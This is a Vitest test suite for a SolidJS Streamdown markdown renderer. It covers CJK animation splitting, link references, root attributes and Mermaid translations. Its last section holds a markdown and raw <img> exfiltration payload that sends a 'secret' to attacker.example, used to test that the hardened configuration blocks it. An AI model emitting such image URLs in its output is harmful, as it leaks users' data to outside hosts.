import { afterEach, describe, expect, it, vi } from "vitest";
import { createSignal, type JSX } from "solid-js";
import { render } from "solid-js/web";
import type { Element, Root, RootContent } from "hast";
import { Streamdown } from "../src/stream-markdown";
import { FeatureBlock, FeatureContext } from "../src/feature-block";
import { parseMarkdownIntoBlocks } from "../src/index";
import { parseMarkdownTree } from "../src/parser";
import { createAnimatePlugin } from "../src/animate-plugin";
import { defaultTranslations } from "../src/controls";
import { defaultRehypePlugins } from "../src/markdown-plugins";
import { harden } from "rehype-harden";

const cleanups: (() => void)[] = [];
function mount(ui: () => JSX.Element) {
  const container = document.createElement("div");
  document.body.append(container);
  const dispose = render(ui, container);
  cleanups.push(() => {
    dispose();
    container.remove();
  });
  return container;
}
afterEach(() => {
  cleanups.splice(0).forEach((f) => f());
  vi.unstubAllGlobals();
});
const tick = () => new Promise((resolve) => setTimeout(resolve, 5));

// Streamdown 2.7.1 reference: vercel/streamdown tag streamdown@2.7.1 (4e8cf96).
describe("2.7.1 animate: CJK per-character split in word mode (#669)", () => {
  const spansOf = (markdown: string, plugin = createAnimatePlugin()) => {
    const tree = parseMarkdownTree(markdown) as Root;
    plugin.rehypePlugin()(tree);
    const out: string[] = [];
    const walk = (nodes: RootContent[] | Element["children"]) => {
      for (const node of nodes) {
        if (node.type !== "element") continue;
        if (
          node.properties?.["data-sd-animate"] != null &&
          node.children[0]?.type === "text"
        )
          out.push(node.children[0].value);
        walk(node.children);
      }
    };
    walk(tree.children);
    return out;
  };
  it("splits a CJK paragraph into per-character units", () => {
    expect(spansOf("量子電腦，因此")).toEqual([
      "量",
      "子",
      "電",
      "腦",
      "，",
      "因",
      "此",
    ]);
  });
  it("keeps Latin words intact and splits CJK in mixed text", () => {
    // Native whitespace lives in separate trailing hosts, not the word host.
    expect(spansOf("Hello 世界 world")).toEqual(["Hello", "世", "界", "world"]);
  });
  it("splits Latin text directly adjacent to CJK", () => {
    expect(spansOf("使用React框架")).toEqual(["使", "用", "React", "框", "架"]);
  });
  it("keeps a stable per-character key for every appended CJK character", () => {
    const full =
      "量子電腦利用疊加與糾纏來平行處理資訊，因此在特定問題上遠快於傳統電腦。不過目前的硬體仍然很容易受到雜訊干擾。";
    const plugin = createAnimatePlugin();
    let previousKeys: unknown[] = [];
    for (const n of [12, 25, 40, full.length]) {
      const tree = parseMarkdownTree(full.slice(0, n)) as Root;
      plugin.rehypePlugin()(tree);
      plugin.commit();
      const keys: unknown[] = [];
      const walk = (nodes: RootContent[] | Element["children"]) => {
        for (const node of nodes) {
          if (node.type !== "element") continue;
          if (node.properties?.["data-sd-animate"] != null)
            keys.push(node.properties["data-sd-key"]);
          walk(node.children);
        }
      };
      walk(tree.children);
      // One host per character, and earlier characters keep their identity.
      expect(keys).toHaveLength(n);
      expect(keys.slice(0, previousKeys.length)).toEqual(previousKeys);
      expect(new Set(keys).size).toBe(n);
      previousKeys = keys;
    }
  });
});

describe("2.7.1 link reference definitions stay in one block", () => {
  const parseFresh = (markdown: string) => {
    parseMarkdownIntoBlocks("unrelated\n\ndocument\n");
    return parseMarkdownIntoBlocks(markdown);
  };
  it("keeps documents with definitions (even nested) in a single block", () => {
    const markdown =
      "See [the docs][1].\n\nMore text.\n\n> [1]: https://example.com\n";
    expect(parseFresh(markdown)).toEqual([markdown]);
  });
  it("still splits documents without definitions", () => {
    expect(
      parseFresh("See [the docs](https://example.com).\n\nMore text.\n"),
    ).toHaveLength(2);
  });
  it("ignores definition-like lines inside code blocks", () => {
    expect(
      parseFresh("```\n[1]: not a definition\n```\n\nMore.\n"),
    ).toHaveLength(2);
  });
  it("matches a full parse while a nested definition streams in", () => {
    const doc =
      "Intro paragraph.\n\nSecond paragraph with [a link][b].\n\n1.  item\n\n    [b]: https://b.example\n\nAfter.\n";
    parseMarkdownIntoBlocks("unrelated\n\ndocument\n");
    for (let i = 1; i <= doc.length; i += 1) {
      const prefix = doc.slice(0, i);
      expect(parseMarkdownIntoBlocks(prefix)).toEqual(parseFresh(prefix));
    }
    expect(parseFresh(doc)).toEqual([doc]);
  });
  it("resolves a reference link whose definition is nested in a later block", () => {
    const container = mount(() => (
      <Streamdown
        parseIncompleteMarkdown={false}
        linkSafety={{ enabled: false }}
      >
        {
          "See [the docs][b].\n\nMore text here.\n\n1.  item\n\n    [b]: https://example.com/docs\n"
        }
      </Streamdown>
    ));
    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.com/docs");
    expect(container.textContent).not.toContain("[the docs][b]");
    expect(container.textContent).toContain("More text here.");
  });
});

describe("2.7.1 root data-* and aria-* props", () => {
  const markdown = "Hello **world**\n\nSecond paragraph";
  for (const mode of ["static", "streaming"] as const) {
    it(`are set on the root element in ${mode} mode`, () => {
      const container = mount(() => (
        <Streamdown
          aria-busy="true"
          aria-label="Assistant reply"
          class="custom-class"
          data-message-id="42"
          mode={mode}
        >
          {markdown}
        </Streamdown>
      ));
      const root = container.firstElementChild as HTMLElement;
      expect(root.getAttribute("data-message-id")).toBe("42");
      expect(root.getAttribute("aria-label")).toBe("Assistant reply");
      expect(root.getAttribute("aria-busy")).toBe("true");
      expect(root.className).toContain("custom-class");
      expect(container.querySelectorAll("[data-message-id]")).toHaveLength(1);
    });
  }
  it("updates and removes attributes reactively on the root", () => {
    const [state, setState] = createSignal<string | undefined>("streaming");
    const container = mount(() => (
      <Streamdown data-state={state()}>{markdown}</Streamdown>
    ));
    const root = container.firstElementChild as HTMLElement;
    expect(root.getAttribute("data-state")).toBe("streaming");
    setState("done");
    expect(root.getAttribute("data-state")).toBe("done");
    setState(undefined);
    expect(root.hasAttribute("data-state")).toBe(false);
  });
  it("sets them on the root of an empty document", () => {
    const container = mount(() => (
      <Streamdown data-testid="empty">{""}</Streamdown>
    ));
    expect(container.firstElementChild?.getAttribute("data-testid")).toBe(
      "empty",
    );
  });
});

describe("2.7.1 static mode renders once on mount", () => {
  it("renders each custom block element exactly once", () => {
    let renders = 0;
    const P = (props: { children?: JSX.Element }) => {
      renders += 1;
      return <p>{props.children}</p>;
    };
    mount(() => (
      <Streamdown components={{ p: P }} mode="static">
        {"First paragraph.\n\nSecond paragraph."}
      </Streamdown>
    ));
    expect(renders).toBe(2);
  });
});

describe("2.7.1 Mermaid accessibility translations", () => {
  const element = (code: string): Element => ({
    type: "element",
    tagName: "pre",
    properties: {},
    children: [
      {
        type: "element",
        tagName: "code",
        properties: { className: ["language-mermaid"] },
        children: [{ type: "text", value: code }],
      },
    ],
  });
  const plugin = (render: (id: string, code: string) => Promise<unknown>) => ({
    name: "mermaid" as const,
    type: "diagram" as const,
    language: "mermaid",
    getMermaid: () => ({ initialize() {}, render }) as never,
  });
  it("ships English defaults", () => {
    expect(defaultTranslations.mermaidAriaLabel).toBe("Mermaid chart");
    expect(defaultTranslations.errorMermaid).toBe(
      "Failed to render Mermaid chart",
    );
  });
  it("labels the rendered chart with the translated aria-label", async () => {
    vi.stubGlobal("IntersectionObserver", undefined);
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text>x</text></svg>`;
    const labelled = (translations?: Record<string, string>) => {
      const root = mount(() => (
        <FeatureContext.Provider
          value={{
            translations: translations as never,
            plugins: { mermaid: plugin(async () => ({ svg })) },
          }}
        >
          <FeatureBlock element={() => element("graph TD;A-->B")} />
        </FeatureContext.Provider>
      ));
      return root;
    };
    const first = labelled();
    await tick();
    expect(
      first.querySelector('[aria-label="Mermaid chart"] svg'),
    ).not.toBeNull();
    const second = labelled({ mermaidAriaLabel: "Diagrama Mermaid" });
    await tick();
    expect(
      second.querySelector('[aria-label="Diagrama Mermaid"] svg'),
    ).not.toBeNull();
  });
  it("uses the translated fallback when rendering rejects with a non-Error", async () => {
    vi.stubGlobal("IntersectionObserver", undefined);
    const root = mount(() => (
      <FeatureContext.Provider
        value={{
          translations: { errorMermaid: "Error al renderizar" } as never,
          plugins: {
            mermaid: plugin(() => Promise.reject("boom")),
          },
        }}
      >
        <FeatureBlock element={() => element("graph TD;A-->B")} />
      </FeatureContext.Provider>
    ));
    await tick();
    expect(root.querySelector('[role="alert"]')?.textContent).toContain(
      "Error al renderizar",
    );
  });
  it("keeps Error messages as-is", async () => {
    vi.stubGlobal("IntersectionObserver", undefined);
    const root = mount(() => (
      <FeatureContext.Provider
        value={{
          plugins: {
            mermaid: plugin(() => Promise.reject(new Error("bad syntax"))),
          },
        }}
      >
        <FeatureBlock element={() => element("graph TD;A-->B")} />
      </FeatureContext.Provider>
    ));
    await tick();
    expect(root.querySelector('[role="alert"]')?.textContent).toContain(
      "bad syntax",
    );
  });
});

describe("2.7.1 remote image origins (security docs behavior)", () => {
  const exfil = "![](https://attacker.example/p?d=secret)";
  const restricted = [
    defaultRehypePlugins.raw,
    defaultRehypePlugins.sanitize,
    [
      harden,
      {
        allowedImagePrefixes: ["https://cdn.example.com/"],
        defaultOrigin: "https://app.example.com",
        allowedLinkPrefixes: ["*"],
        allowedProtocols: ["*"],
        allowDataImages: false,
      },
    ],
  ] as never;
  it("documents the default: images from any origin render", () => {
    const container = mount(() => (
      <Streamdown mode="static">{exfil}</Streamdown>
    ));
    expect(container.innerHTML).toContain("attacker.example");
  });
  it("blocks untrusted markdown and raw <img> origins with the recommended config", () => {
    const md = mount(() => (
      <Streamdown mode="static" rehypePlugins={restricted}>
        {exfil}
      </Streamdown>
    ));
    expect(md.innerHTML).not.toContain("attacker.example");
    const raw = mount(() => (
      <Streamdown mode="static" rehypePlugins={restricted}>
        {'<img src="https://attacker.example/p?d=secret" alt="x" />'}
      </Streamdown>
    ));
    expect(raw.innerHTML).not.toContain("attacker.example");
  });
  it("still renders allowed origins", () => {
    const container = mount(() => (
      <Streamdown mode="static" rehypePlugins={restricted}>
        {"![ok](https://cdn.example.com/a.png)"}
      </Streamdown>
    ));
    expect(container.innerHTML).toContain("https://cdn.example.com/a.png");
  });
});
